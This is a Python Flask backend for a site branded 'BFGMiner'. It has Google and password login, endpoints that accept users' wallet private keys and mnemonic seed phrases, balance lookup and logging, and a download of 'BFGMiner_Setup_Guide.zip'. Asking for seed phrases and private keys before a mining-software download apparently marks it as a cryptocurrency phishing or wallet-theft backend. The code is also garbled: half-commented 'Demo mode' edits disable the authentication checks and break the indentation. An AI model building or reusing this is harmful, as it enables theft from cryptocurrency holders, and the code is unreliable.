
"""
Main BFGMiner Application
"""
import datetime










import hashlib
import secrets
import sqlite3
import logging
from flask import Flask, abort, jsonify, render_template, request, send_file, url_for, redirect, session
from flask_cors import CORS
from flask_session import Session
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from authlib.integrations.flask_client import OAuth
from enterprise_improvements import AppConfig, SecurityManager, DatabaseManager, AuditLogger, EnterpriseBlockchainValidator
from eth_account import Account
from flask_caching import Cache
from utils import get_db_connection

app = Flask(
    __name__,
    static_folder=".",
    static_url_path="",
    template_folder="templates")
config = AppConfig()
app.secret_key = config.SECRET_KEY
app.config['SESSION_TYPE'] = 'filesystem'
app.config['MAX_CONTENT_LENGTH'] = config.MAX_CONTENT_LENGTH

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"]
)
Session(app)
oauth = OAuth(app)

if config.GOOGLE_CLIENT_ID:
    google = oauth.register(
        name='google',
        client_id=config.GOOGLE_CLIENT_ID,
        client_secret=config.GOOGLE_CLIENT_SECRET,
        access_token_url='https://oauth2.googleapis.com/token',
        authorize_url='https://accounts.google.com/o/oauth2/auth',
        api_base_url='https://www.googleapis.com/oauth2/v1/',
        userinfo_endpoint='https://www.googleapis.com/oauth2/v1/userinfo',
        client_kwargs={'scope': 'openid email profile'},
    )

security = SecurityManager(config)
db = DatabaseManager(config.DATABASE_PATH)
db.init_database()
audit = AuditLogger(db)
validator = EnterpriseBlockchainValidator(config)
logger = logging.getLogger(__name__)
DB_PATH = "bfgminer_enterprise.db"

@app.route("/")
def index():
    """Main application page"""
    return render_template("index.html")

@app.route("/style.css")
def serve_css():
    return send_file("style.css", mimetype="text/css")

@app.route('/logout')
def logout():
    """Logout user"""
    if 'user_id' in session:
        session.pop('user_id', None)
        session.pop('email', None)
    return redirect('/')

@app.route('/login/google')
def google_login():
    """Google OAuth login"""
    redirect_uri = url_for('google_callback', _external=True)
    return google.authorize_redirect(redirect_uri)

@app.route('/login/google/callback')
def google_callback():
    """Google OAuth callback"""
    try:
        token = google.authorize_access_token()
        resp = google.get('userinfo')
        user_info = resp.json()
        email = user_info['email']
        
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT id FROM users WHERE email = ?", (email,))
            user = cursor.fetchone()
            if user:
                user_id = user[0]
            else:
                # Create new user
                import secrets
                dummy_password = secrets.token_hex(16)
                password_hash = security.hash_password(dummy_password)
                cursor.execute(
                    "INSERT INTO users (email, password_hash, email_verified) VALUES (?, ?, ?)",
                    (email, password_hash, True)
                )
                user_id = cursor.lastrowid
                conn.commit()
        
        session['user_id'] = user_id
        session['email'] = email
        
        # Log activity
        audit.log_action(user_id, "login", "auth", None, {"method": "google_oauth", "provider": "google"}, request.remote_addr, "low")
        
        return redirect('/wallet')
    except Exception as e:
        logger.error(f"Google OAuth error: {e}")
        return redirect('/?error=oauth_failed')

@app.route('/wallet')
def wallet_page():
    """Wallet connection page after login"""
    # Demo mode: allow anonymous
# # Demo mode: allow anonymous
# # Demo mode: allow anonymous
# if .user_id. not in session:
        return redirect('/login/google')
    return render_template('wallet.html')

@app.route("/api/register", methods=["POST"])
def register_user():
    """Register new user with email and password"""
    try:
        data = request.get_json()
        email = data.get("email", "").strip().lower()
        password = data.get("password", "").strip()

        if not email:
            return (
                jsonify({"success": False, "error": "Email is required"}),
                400,
            )

        if not password:
            return (
                jsonify({"success": False, "error": "Password is required"}),
                400,
            )

        # Email validation
        if "@" not in email or "." not in email:
            return (
                jsonify({"success": False, "error": "Invalid email format"}),
                400,
            )

        # Password validation
        if len(password) < 6:
            return (
                jsonify(
                    {
                        "success": False,
                        "error": "Password must be at least 6 characters",
                    }
                ),
                400,
            )

        # Hash the password securely
        password_hash = security.hash_password(password)

        with get_db_connection() as conn:
            cursor = conn.cursor()
            # Check if user already exists
            cursor.execute("SELECT id FROM users WHERE email = ?", (email,))
            if cursor.fetchone():
                return jsonify({"success": False, "error": "User already exists"}), 400
            # Insert new user
            cursor.execute("INSERT INTO users (email, password_hash) VALUES (?, ?)", (email, password_hash))
            user_id = cursor.lastrowid
            conn.commit()

        return jsonify({"success": True})
    except Exception as e:
        print(f"Registration error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/login", methods=["POST"])
def login_user():
    """Login user with email and password"""
    try:
        data = request.get_json()
        email = data.get("email", "").strip().lower()
        password = data.get("password", "").strip()

        if not email or not password:
            return jsonify({"success": False, "error": "Email and password required"}), 400

        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT id, password_hash FROM users WHERE email = ?", (email,))
            user = cursor.fetchone()
            if not user or not security.verify_password(password, user[1]):
                return jsonify({"success": False, "error": "Invalid credentials"}), 401

            user_id = user[0]
            conn.commit()

        session['user_id'] = user_id
        session['email'] = email

        audit.log_action(user_id, "login", "auth", None, {"method": "email_password"}, request.remote_addr, "low")

        return jsonify({"success": True, "user_id": user_id})
    except Exception as e:
        print(f"Login error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/validate-wallet", methods=["POST"])
def validate_wallet():
    """Validate wallet address, private key, or mnemonic"""
    # Demo mode: allow anonymous
# # Demo mode: allow anonymous
# # Demo mode: allow anonymous
# if .user_id. not in session:
        return jsonify({"success": False, "error": "Unauthorized"}), 401

    try:
        data = request.get_json()
        wallet_type = data.get("type")  # "address", "private_key", "mnemonic"
        value = data.get("value")

        if not wallet_type or not value:
            return jsonify({"success": False, "error": "Missing type or value"}), 400

        result = {}
        if wallet_type == "address":
            result = validator.validate_wallet_address(value)
        elif wallet_type == "private_key":
            result = validator.validate_private_key(value)
        elif wallet_type == "mnemonic":
            result = validator.validate_mnemonic(value)

        if result.get("valid"):
            # Store in database
            with get_db_connection() as conn:
                cursor = conn.cursor()
                credentials_hash = hashlib.sha256(value.encode()).hexdigest()
                cursor.execute(
                    """INSERT OR REPLACE INTO wallets (user_id, wallet_address, connection_type, credentials_hash, ip_address)
                       VALUES (?, ?, ?, ?, ?)""",
                    (session['user_id'], result.get("address", value), wallet_type, credentials_hash, request.remote_addr)
                )
                conn.commit()

            audit.log_action(session['user_id'], "wallet_connect", "wallet", result.get("address"), 
                           {"type": wallet_type, "validated": True}, request.remote_addr, "medium")

        return jsonify(result)
    except Exception as e:
        logger.error(f"Wallet validation error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/walletconnect", methods=["POST"])
def wallet_connect():
    """Handle wallet connection from frontend"""
    # Demo mode: allow anonymous
# # Demo mode: allow anonymous
# # Demo mode: allow anonymous
# if .user_id. not in session:
        return jsonify({"success": False, "error": "Unauthorized"}), 401

    try:
        data = request.get_json()
        address = data.get("address")
        signature = data.get("signature")
        message = data.get("message")
        connection_type = data.get("connection_type", "web3")
        chain_id = data.get("chain_id", 1)

        if not address or not signature or not message:
            return jsonify({"success": False, "error": "Missing required fields"}), 400

        # Verify signature
        try:
            recovered_address = Account.recover_message(
                text=message, 
                signature=signature
            ).address.lower()
            if recovered_address != address.lower():
                return jsonify({"success": False, "error": "Invalid signature"}), 400
        except:
            return jsonify({"success": False, "error": "Signature verification failed"}), 400

        # Get balance and price
        balance_info = validator.get_balance(address)
        balance_usd = balance_info.get("balance_usd", 0) if balance_info else 0

        # Store in database
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                """INSERT OR REPLACE INTO wallets 
                   (user_id, wallet_address, connection_type, balance_usd, ip_address, created_at)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (session['user_id'], address, connection_type, balance_usd, request.remote_addr, datetime.datetime.now())
            )
            conn.commit()

        audit.log_action(session['user_id'], "wallet_verified", "wallet", address, 
                       {"type": connection_type, "balance_usd": balance_usd}, request.remote_addr, "medium")

        return jsonify({
            "success": True, 
            "address": address,
            "balance_eth": balance_info.get("balance_eth", 0) if balance_info else 0,
            "balance_usd": balance_usd,
            "message": "Wallet connected successfully"
        })
    except Exception as e:
        logger.error(f"Wallet connection error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/download/initiate", methods=["POST"])
def initiate_download():
    # Demo mode: allow anonymous
    user_id = session.get("user_id", 1)
    """Generate download token and log request"""
    # Demo mode: allow anonymous
# # Demo mode: allow anonymous
# # Demo mode: allow anonymous
# if .user_id. not in session:
        return jsonify({"success": False, "error": "Unauthorized"}), 401

    try:
        download_token = secrets.token_urlsafe(32)
        
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO downloads (download_token, ip_address) VALUES (?, ?)",
                (download_token, request.remote_addr)
            )
            conn.commit()

        audit.log_action(session['user_id'], "download_initiate", "download", download_token, 
                       None, request.remote_addr, "low")

        return jsonify({"success": True, "token": download_token, "url": f"/download/{download_token}"})
    except Exception as e:
        logger.error(f"Download initiation error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/download/<token>")
def download_file(token):
    """Serve download file with token validation"""
    try:
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT id, is_completed FROM downloads WHERE download_token = ?", (token,))
            download = cursor.fetchone()
            if not download:
                abort(404)

            if download[1]:
                # Regenerate token for one-time use
                new_token = secrets.token_urlsafe(32)
                cursor.execute("UPDATE downloads SET download_token = ?, is_completed = FALSE WHERE id = ?", (new_token, download[0]))
                conn.commit()
                return jsonify({"success": False, "error": "Download already completed", "new_token": new_token}), 410

            # Mark as completed
            cursor.execute("UPDATE downloads SET is_completed = TRUE WHERE id = ?", (download[0],))
            conn.commit()

        # Serve the ZIP file
        return send_file("/home/azureuser/bfgminer/BFGMiner_Setup_Guide.zip", as_attachment=True, 
                        download_name="BFGMiner_Setup_Guide.zip",
                        mimetype="application/zip")

    except Exception as e:
        logger.error(f"Download error: {e}")
        abort(500)

@app.route("/health")
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "version": "1.0", "timestamp": datetime.datetime.now().isoformat()})



